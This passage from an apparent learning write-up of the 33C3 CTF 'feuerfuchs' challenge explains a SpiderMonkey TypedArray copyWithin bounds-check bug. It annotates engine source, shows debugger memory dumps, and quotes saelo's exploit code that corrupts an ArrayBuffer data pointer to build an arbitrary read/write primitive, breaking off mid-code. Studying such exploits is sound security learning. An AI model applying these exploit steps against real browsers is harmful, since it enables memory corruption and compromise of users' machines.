&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;TypedArrayCopyWithin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;end&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;undefined&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// target = 0 ( = hax);&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// start = 40;&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// end = 48;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;.....................&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;obj&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;TypedArrayLength&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// len = 96&lt;/span&gt;

    &lt;span class=&quot;nx&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7FFFFFFF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
           &lt;span class=&quot;s2&quot;&gt;&quot;assumed by some of the math below, see also the other assertions&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

     &lt;span class=&quot;c1&quot;&gt;// the following line trigger the &quot;valueOf&quot; function&lt;/span&gt;
     &lt;span class=&quot;c1&quot;&gt;// this make the view's offset = 88 and length = 8&lt;/span&gt;
     &lt;span class=&quot;c1&quot;&gt;// however, &quot;len&quot; variable is still 96&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;relativeTarget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ToInteger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// trigger valueOf&lt;/span&gt;

    &lt;span class=&quot;cm&quot;&gt;/* to = 0 */&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;relativeTarget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;std_Math_max&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;relativeTarget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                                &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;std_Math_min&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;relativeTarget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;relativeStart&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ToInteger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;/* from = 40 */&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;relativeStart&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;std_Math_max&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;relativeStart&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                                 &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;std_Math_min&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;relativeStart&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;relativeEnd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;end&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;undefined&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;len&lt;/span&gt;
                                        &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ToInteger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;/* final = 48 */&lt;/span&gt;    
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;relativeEnd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;std_Math_max&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;relativeEnd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                                &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;std_Math_min&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;relativeEnd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;/* count = 8 */&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;std_Math_min&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;p&quot;&gt;....................................&lt;/span&gt;
    
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;MoveTypedArrayElements&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// call memmove inside&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s sum up some important part of this function:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;It first read the &lt;code class=&quot;highlighter-rouge&quot;&gt;view&lt;/code&gt;’s length and stored the value in the &lt;code class=&quot;highlighter-rouge&quot;&gt;len&lt;/code&gt; variable. Later it will use this variable to perform some boundary check.&lt;/li&gt;
  &lt;li&gt;However, at line 15 the &lt;code class=&quot;highlighter-rouge&quot;&gt;ToInteger(target)&lt;/code&gt; will trigger the &lt;code class=&quot;highlighter-rouge&quot;&gt;valueOf&lt;/code&gt; function in variable &lt;code class=&quot;highlighter-rouge&quot;&gt;hax&lt;/code&gt;, making &lt;code class=&quot;highlighter-rouge&quot;&gt;view&lt;/code&gt;’s &lt;code class=&quot;highlighter-rouge&quot;&gt;offset&lt;/code&gt; become &lt;code class=&quot;highlighter-rouge&quot;&gt;88&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;length&lt;/code&gt; become &lt;code class=&quot;highlighter-rouge&quot;&gt;8&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;
    &lt;table&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
          &lt;td&gt;But the code still use &lt;code class=&quot;highlighter-rouge&quot;&gt;len&lt;/code&gt; variable ( which in this case = &lt;code class=&quot;highlighter-rouge&quot;&gt;96&lt;/code&gt; ) to perform the boundary check, making us able to bypass the checks and eventually calling ` MoveTypedArrayElements(obj, to&lt;/td&gt;
          &lt;td&gt;0, from&lt;/td&gt;
          &lt;td&gt;0, count&lt;/td&gt;
          &lt;td&gt;0);`&lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
    &lt;/table&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Inside the &lt;code class=&quot;highlighter-rouge&quot;&gt;MoveTypedArrayElements&lt;/code&gt; will call &lt;code class=&quot;highlighter-rouge&quot;&gt;memmove(dest, src, count)&lt;/code&gt;, which in this case:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;src&lt;/code&gt; will be &lt;code class=&quot;highlighter-rouge&quot;&gt;view's data pointer + 88 + 40&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;dest&lt;/code&gt; will be &lt;code class=&quot;highlighter-rouge&quot;&gt;view's data pointer + 88&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;count&lt;/code&gt; will be &lt;code class=&quot;highlighter-rouge&quot;&gt;8&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Let’s see what data will be copied to &lt;code class=&quot;highlighter-rouge&quot;&gt;dest&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/copy_addr.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here &lt;code class=&quot;highlighter-rouge&quot;&gt;dest&lt;/code&gt; = &lt;code class=&quot;highlighter-rouge&quot;&gt;0x7ffff7ebc558&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;src&lt;/code&gt; = &lt;code class=&quot;highlighter-rouge&quot;&gt;0x7ffff7ebc580&lt;/code&gt;, we can see the value &lt;code class=&quot;highlighter-rouge&quot;&gt;0x3ffffbf5e2d0&lt;/code&gt; will be copied to &lt;code class=&quot;highlighter-rouge&quot;&gt;dest&lt;/code&gt;. According to saelo’s comment in the exploit:&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;c1&quot;&gt;// First qword in adjusted view now contains the data pointer (which is stored as a Private, thus needs to be shifted)&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;LShift1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Int64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;view&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// ptr will point to inline data so we can calculate the address of the preceeding ArrayBuffer&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;addressOfInnerArrayBuffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Sub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So &lt;code class=&quot;highlighter-rouge&quot;&gt;0x3ffffbf5e2d0&lt;/code&gt; is actually a data pointer of an ArrayBuffer in its “Private” form. If we left shift the value 1 bit, it will become &lt;code class=&quot;highlighter-rouge&quot;&gt;0x7ffff7ebc5a0&lt;/code&gt;, which is the data pointer of &lt;code class=&quot;highlighter-rouge&quot;&gt;buffers[80]&lt;/code&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;I’ve traced the source code of SpiderMonkey and couldn’t find the definition of the “Private form”, so I still don’t know why you need to left shift the value 1 bit to get the correct address of the data pointer. I would really appreciate it if someone can tell me where the definition is.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;So what &lt;code class=&quot;highlighter-rouge&quot;&gt;view.copyWithin(hax, 32+8, 40+8);&lt;/code&gt; does is copy the next ArrayBuffer’s ( &lt;code class=&quot;highlighter-rouge&quot;&gt;buffers[80]&lt;/code&gt; ) data pointer into TypedArray &lt;code class=&quot;highlighter-rouge&quot;&gt;view&lt;/code&gt; .&lt;/p&gt;

&lt;p&gt;Later it stores the data pointer into &lt;code class=&quot;highlighter-rouge&quot;&gt;ptr&lt;/code&gt;, and minus &lt;code class=&quot;highlighter-rouge&quot;&gt;224&lt;/code&gt; to get the &lt;code class=&quot;highlighter-rouge&quot;&gt;addressOfInnerArrayBuffer&lt;/code&gt;, which in this case is &lt;code class=&quot;highlighter-rouge&quot;&gt;0x7ffff7ebc4c0&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gef➤  tel 0x7ffff7ebc4c0
0x00007ffff7ebc4c0│+0x00: 0x00007ffff7eb90d0  &amp;lt;-- group_
0x00007ffff7ebc4c8│+0x08: 0x00007ffff7eb73d0  &amp;lt;-- shape_
0x00007ffff7ebc4d0│+0x10: 0x0000000000000000  &amp;lt;-- slots_
0x00007ffff7ebc4d8│+0x18: 0x00000000013c7b70  &amp;lt;-- elements_
0x00007ffff7ebc4e0│+0x20: 0x00003ffffbf5e280  &amp;lt;-- data pointer
0x00007ffff7ebc4e8│+0x28: 0xfff8800000000060  &amp;lt;-- length
0x00007ffff7ebc4f0│+0x30: 0xfffe7ffff4601e60  &amp;lt;-- JSObject ( point to Uint8Array )
0x00007ffff7ebc4f8│+0x38: 0xfff8800000000000  &amp;lt;-- offet
0x00007ffff7ebc500│+0x40: 0x0000000000000000  &amp;lt;-- start point of a data pointer
0x00007ffff7ebc508│+0x48: 0x0000000000000000

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can see that &lt;code class=&quot;highlighter-rouge&quot;&gt;0x7ffff7ebc4c0&lt;/code&gt; is “the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;buffers[79]&lt;/code&gt;”. If we left shift the data pointer &lt;code class=&quot;highlighter-rouge&quot;&gt;0x3ffffbf5e280&lt;/code&gt;, we’ll get &lt;code class=&quot;highlighter-rouge&quot;&gt;0x7ffff7ebc500&lt;/code&gt; – the data pointer of &lt;code class=&quot;highlighter-rouge&quot;&gt;buffers[79]&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Let’s see what does the exploit do next:&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;c1&quot;&gt;// Trigger the bug a second time to write the modified data pointer&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;view&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;RShift1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addressOfInnerArrayBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;view&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;view&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;copyWithin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;hax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It triggers the bug second time, and modified &lt;code class=&quot;highlighter-rouge&quot;&gt;buffers[80]&lt;/code&gt;’s data pointer into &lt;code class=&quot;highlighter-rouge&quot;&gt;addressOfInnerArrayBuffer&lt;/code&gt;. This make us able to modified &lt;code class=&quot;highlighter-rouge&quot;&gt;buffers[79]&lt;/code&gt;’s structure by editing &lt;code class=&quot;highlighter-rouge&quot;&gt;buffers[80]&lt;/code&gt;, and thus we’ll have an arbitrary read/write primitive !&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;c1&quot;&gt;// |outer| is a byte view onto the corrupted ArrayBuffer which now allows us to arbitrarily modify the ArrayBuffer |inner|&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;inner&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;buffers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;79&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;outer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Uint8Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// here buffer = buffers[80]&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// Increase the size of the inner ArrayBuffer&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;outer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;43&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// Object to access the process' memory&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;memory&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;// Set data pointer of |inner|&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;outer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;RShift1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;// Uint8Array's cache the data pointer of the underlying ArrayBuffer&lt;/span&gt;
            &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;innerView&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Uint8Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;inner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;innerView&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
